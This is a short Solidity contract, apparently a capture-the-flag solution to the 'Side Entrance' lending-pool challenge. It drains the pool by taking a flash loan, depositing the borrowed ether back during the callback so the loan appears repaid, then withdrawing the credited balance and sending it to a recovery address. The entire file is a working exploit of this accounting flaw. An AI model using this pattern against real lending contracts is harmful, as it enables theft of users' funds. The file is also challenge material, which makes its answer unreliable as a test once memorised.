// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {

    SideEntranceLenderPool pool;
    address recovery;

    error FailedTransaction();

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
    }

    function attack() external {
        pool.flashLoan(1000e18);
        pool.withdraw();
        (bool success,) = recovery.call{value:address(this).balance}("");
        if (!success) revert FailedTransaction();
    }
    
    receive() external payable {}
}